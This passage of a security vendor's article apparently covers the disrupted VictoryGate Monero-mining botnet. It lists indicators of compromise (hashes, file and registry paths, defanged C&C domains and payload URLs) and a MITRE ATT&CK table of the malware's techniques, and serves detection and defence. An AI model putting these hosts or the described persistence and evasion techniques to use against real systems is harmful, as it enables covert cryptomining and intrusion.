<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">MSIL/VictoryGate.A</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">398C99FD804043863959CC34C68B0305B1131388</span><br />
</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">MSIL/VictoryGate.A</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">a187d8be61b7ad6c328f3ee9ac66f3d2f4b48c6b</span><br />
</td>
</tr>
<tr class="row-4 even">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">MSIL/VictoryGate.B</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">483a55389702cdc83223c563efb9151a704a973e</span><br />
</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1"><span style="font-family: courier new, courier, monospace;">MSIL/VictoryGate.C</span><br />
</td><td class="column-2"><span style="font-family: courier new, courier, monospace;">686eef924e6b7aadb5bcff1045b25163501670e6</span><br />
</td>
</tr>
</tbody>
</table>
</span></p>
<h3>Filesystem</h3>
<p><span style="font-family: courier new, courier, monospace;">%ProgramData%\JcmewjJky\jcmewjjky.ico</span><br />
<span style="font-family: courier new, courier, monospace;">%ProgramData%\JcmewjJky\jcmewjjky.exe</span><br />
<span style="font-family: courier new, courier, monospace;">%ProgramData%\JcmewjJky\jcmewjjky.au3</span><br />
<span style="font-family: courier new, courier, monospace;">%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\ctfmon.url.lnk</span><br />
<span style="font-family: courier new, courier, monospace;">%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\tpmvsucgr.url</span><br />
<span style="font-family: courier new, courier, monospace;">%AppData%\tpmvscugr.exe</span><br />
<span style="font-family: courier new, courier, monospace;">%AppData%\ctfmon2.exe</span><br />
<span style="font-family: courier new, courier, monospace;">HKCU/Software/JcMewjJKy</span><br />
<span style="font-family: courier new, courier, monospace;">HKLM/Software/Microsoft/Windows NT/CurrentVersion/Schedule/TaskCache/Tree/rwIAMblfuvoss</span><br />
<span style="font-family: courier new, courier, monospace;">HKCU/Software/Victory</span></p>
<h3>C&amp;C Domains</h3>
<p>* Domains being sinkholed.</p>
<p><span style="font-family: courier new, courier, monospace;">scitie.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">ddw.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">c0d3.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">volvo.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">xcod.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">mrxud.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">d001.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">xkm.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">luio.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">xcud.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">aut2scr.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">fanbmypersondrive[.]icu</span><br />
<span style="font-family: courier new, courier, monospace;">mydrivepersonpdvsa[.]icu</span><br />
<span style="font-family: courier new, courier, monospace;">mydrivepersonfanb[.]icu</span><br />
<span style="font-family: courier new, courier, monospace;">mycountermppd[.]xyz</span><br />
<span style="font-family: courier new, courier, monospace;">calypsoempire.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">mgud2xd.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">aut0hk.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">xcud.zapto[.]org</span><br />
<span style="font-family: courier new, courier, monospace;">accountantlive[.]icu</span><br />
<span style="font-family: courier new, courier, monospace;">shittybooks[.]review</span><br />
<span style="font-family: courier new, courier, monospace;">hakerz123.ddns[.]net</span><br />
<span style="font-family: courier new, courier, monospace;">jcmewjjkyc0d3.ddns[.]net *</span><br />
<span style="font-family: courier new, courier, monospace;">urtyerc0d3.ddns[.]net *</span><br />
<span style="font-family: courier new, courier, monospace;">MoOHyAYeuaut2scr.ddns[.]net *</span><br />
<span style="font-family: courier new, courier, monospace;">pNUMWWDLjPmzg.ddns[.]net *</span><br />
<span style="font-family: courier new, courier, monospace;">gJyapcAGoc0d3.ddns[.]net *</span><br />
<span style="font-family: courier new, courier, monospace;">OHOFqlXNJluio.ddns[.]net *</span></p>
<h3>Payload URLs</h3>
<p><span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00711/2czcy5xvh7br.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00711/a8nr26g1zcot.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00711/6400e1i9fsj6.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00711/pwgzuq5902m2.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00711/lhm3w37zuiwy.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00711/3mwdm6tbgcq6.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00712/sy8rtcxlh1pu.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">gulfup[.]me/i/00712/o56zgjhefny0.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">b.top4top[.]io/p_152411ncc1.jpeg</span><br />
<span style="font-family: courier new, courier, monospace;">pastebin[.]com/raw/fEAuhPYh</span></p>
<h2>MITRE ATT&amp;CK techniques</h2>

<table id="tablepress-810" class="tablepress tablepress-id-810">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Initial access</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1091/" rel="noopener" target="_blank">T1091</a></td><td class="column-3">Replication through Removable Media</td><td class="column-4">Compiles AutoIt scripts that replace original files on the USB drive.</td>
</tr>
<tr class="row-3 odd">
	<td rowspan="5" class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1064/" rel="noopener" target="_blank">T1064</a></td><td class="column-3">Scripting</td><td class="column-4">Uses AutoIt and VBS scripts in various stages of the malware.</td>
</tr>
<tr class="row-4 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1129/" rel="noopener" target="_blank">T1129</a></td><td class="column-3">Execution through Module Load</td><td class="column-4">Loads and runs binaries during execution.</td>
</tr>
<tr class="row-5 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1085/" rel="noopener" target="_blank">T1085</a></td><td class="column-3">Rundll32</td><td class="column-4">Uses  <span style="font-family: courier new, courier, monospace;">rundll32.exe</span> through the AutoIt function<span style="font-family: courier new, courier, monospace;">  INETGET </span> to download payloads.</td>
</tr>
<tr class="row-6 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1106/" rel="noopener" target="_blank">T1106</a></td><td class="column-3">Execution through API</td><td class="column-4">Uses API calls such as <span style="font-family: courier new, courier, monospace;">CreateProcessA</span>, <span style="font-family: courier new, courier, monospace;">WriteProcessMemory </span> to run binaries.</td>
</tr>
<tr class="row-7 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1053/" rel="noopener" target="_blank">T1053</a></td><td class="column-3">Scheduled Task</td><td class="column-4">Creates a scheduled task to ensure the miner will run every minute.</td>
</tr>
<tr class="row-8 even">
	<td rowspan="3" class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1158/" rel="noopener" target="_blank">T1158</a></td><td class="column-3">Hidden Files and Directories</td><td class="column-4">Creates hidden directories to hide the payload and propagation files.</td>
</tr>
<tr class="row-9 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1060/" rel="noopener" target="_blank">T1060</a></td><td class="column-3">Registry Run Keys / Startup Folder</td><td class="column-4">Creates a file with LNK extension (shortcut) in the Windows startup folder.</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1053/" rel="noopener" target="_blank">T1053</a></td><td class="column-3">Scheduled Task</td><td class="column-4">Creates a scheduled task to ensure the miner will run every minute.</td>
</tr>
<tr class="row-11 odd">
	<td class="column-1">Privilege Escalation</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener" target="_blank">T1055</a></td><td class="column-3">Process Injection</td><td class="column-4">Gains privilege by injecting itself into legitimate Windows processes.</td>
</tr>
<tr class="row-12 even">
	<td rowspan="6" class="column-1">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1140/" rel="noopener" target="_blank">T1140</a></td><td class="column-3">Deobfuscate/Decode Files or Information</td><td class="column-4">Uses base64 encoding and other obfuscation techniques in various iplaces.</td>
</tr>
<tr class="row-13 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1222/" rel="noopener" target="_blank">T1222</a></td><td class="column-3">File and Directory Permissions Modification</td><td class="column-4">Sets +RHS attributes on files and sirectories.</td>
</tr>
<tr class="row-14 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1009/" rel="noopener" target="_blank">T1009</a></td><td class="column-3">Binary Padding</td><td class="column-4">Uses binary padding to create propagation scripts that have different hashes.</td>
</tr>
<tr class="row-15 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1107/" rel="noopener" target="_blank">T1107</a></td><td class="column-3">File Deletion</td><td class="column-4">Files downloaded in the <span style="font-family: courier new, courier, monospace;">%temp%</span> directory are later deleted.</td>
</tr>
<tr class="row-16 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1093/" rel="noopener" target="_blank">T1093</a></td><td class="column-3">Process Hollowing</td><td class="column-4">Legitimate Windows processes are hollowed and then injected.</td>
</tr>
<tr class="row-17 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1045/" rel="noopener" target="_blank">T1045</a></td><td class="column-3">Software Packing</td><td class="column-4">Many files contain packed binaries using custom techniques.</td>
</tr>
<tr class="row-18 even">
	<td class="column-1">Lateral Movement</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1091/" rel="noopener" target="_blank">T1091</a></td><td class="column-3">Replication through Removable Media</td><td class="column-4">The initial payload is copied to a hidden directory in a removable drive.</td>
</tr>
<tr class="row-19 odd">
	<td class="column-1">Collection</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1005/" rel="noopener" target="_blank">T1005</a></td><td class="column-3">Data from Local System</td><td class="column-4">Some information about the host device is exfiltrated, including username, hostname, antimalware solution, and others.</td>
</tr>
<tr class="row-20 even">
	<td rowspan="2" class="column-1">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1063/" rel="noopener" target="_blank">T1063</a></td><td class="column-3">Security Software Discovery</td><td class="column-4">Performs WMI queries to discover security software installed on the machine.</td>
</tr>
<tr class="row-21 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1057/" rel="noopener" target="_blank">T1057</a></td><td class="column-3">Process Discovery</td><td class="column-4">Tries to determine if the task manager process is open in order to suspend the mining activities.</td>
</tr>
<tr class="row-22 even">
	<td rowspan="4" class="column-1">Command and Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1094/" rel="noopener" target="_blank">T1094</a></td><td class="column-3">Custom Command and Control Protocol</td><td class="column-4">C&amp;C uses two non-standard protocols.</td>
</tr>
<tr class="row-23 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1065/" rel="noopener" target="_blank">T1065</a></td><td class="column-3">Uncommonly Used Port</td><td class="column-4">C&amp;C uses uncommon ports such as 3,030, 6,060 and 19,019.</td>
</tr>
<tr class="row-24 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1008/" rel="noopener" target="_blank">T1008</a></td><td class="column-3">Fallback Channels</td><td class="column-4">Uses backup domain names.</td>
</tr>
<tr class="row-25 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1102/" rel="noopener" target="_blank">T1102</a></td><td class="column-3">Web Service</td><td class="column-4">Uses Pastebin to recover the C&amp;C IP even if DNS resolution fails.</td>
</tr>
<tr class="row-26 even">
	<td rowspan="2" class="column-1">Impact</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1496/" rel="noopener" target="_blank">T1496</a></td><td class="column-3">Resource Hijacking</td><td class="column-4">Victim’s hardware is used to mine cryptocurrency.</td>
</tr>
<tr class="row-27 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1492/" rel="noopener" target="_blank">T1492</a></td><td class="column-3">Stored Data Manipulation</td><td class="column-4">Files stored on USB drives are hidden from the user.</td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/alan-warburton/" title="Alan Warburton">
                    Alan Warburton                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2020-04-23 11:30:57">23 Apr 2020 - 11:30AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    			
		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="//liondigital.us3.list-manage.com/subscribe/post?u=b76f82b1cc198ab1d80665c99&amp;id=102b0810e2" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
					<input type="text" name="email" value="" placeholder="Email...">
					<button>
						Submit					</button>
				</div>
			</form>		
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/botnet/" class="category-tag-btn">Botnet</a>                                                <a href="https://www.welivesecurity.com/2020/10/12/eset-takes-part-global-operation-disrupt-trickbot/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2020/10/eset-trickbot-botnet-global-disruption-operation-623x432.jpg"
                                                         alt="Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2020/10/12/eset-takes-part-global-operation-disrupt-trickbot/">
                                                    ESET takes part in global operation to disrupt Trickbot                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/botnet/" class="category-tag-btn">Botnet</a>                                                <a href="https://www.welivesecurity.com/2018/11/27/3ve-online-ad-fraud-disrupted/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2018/11/shutterstock_411660106-623x432.jpg"
                                                         alt="Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2018/11/27/3ve-online-ad-fraud-disrupted/">
                                                    3ve – Major online ad fraud operation disrupted                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/botnet/" class="category-tag-btn">Botnet</a>                                                <a href="https://www.welivesecurity.com/2018/08/21/smart-irrigation-systems-vulnerable-warn-researchers/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2018/08/Irrigation_Systems-623x432.jpg"
                                                         alt="Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2018/08/21/smart-irrigation-systems-vulnerable-warn-researchers/">
                                                    Smart irrigation systems vulnerable to attacks, warn researchers                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/botnet/" class="category-tag-btn">Botnet</a>                                                <a href="https://www.welivesecurity.com/2018/06/13/us-report-highlights-battle-botnets/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2018/06/USGov_Botnets-623x432.jpg"
                                                         alt="Following ESET’s discovery, a&nbsp;Monero mining botnet is disrupted">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2018/06/13/us-report-highlights-battle-botnets/">
                                                    US government report highlights gaps in battle against botnets                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F04%2F23%2Feset-discovery-monero-mining-botnet-disrupted%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F04%2F23%2Feset-discovery-monero-mining-botnet-disrupted%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F04%2F23%2Feset-discovery-monero-mining-botnet-disrupted%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"137329 https:\/\/backend.welivesecurity.com\/?p=137329","disqusShortname":"welivesecurity","disqusTitle":"Following ESET\u2019s discovery, a\u00a0Monero mining botnet is disrupted","disqusUrl":"https:\/\/www.welivesecurity.com\/2020\/04\/23\/eset-discovery-monero-mining-botnet-disrupted\/","postId":"137329"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>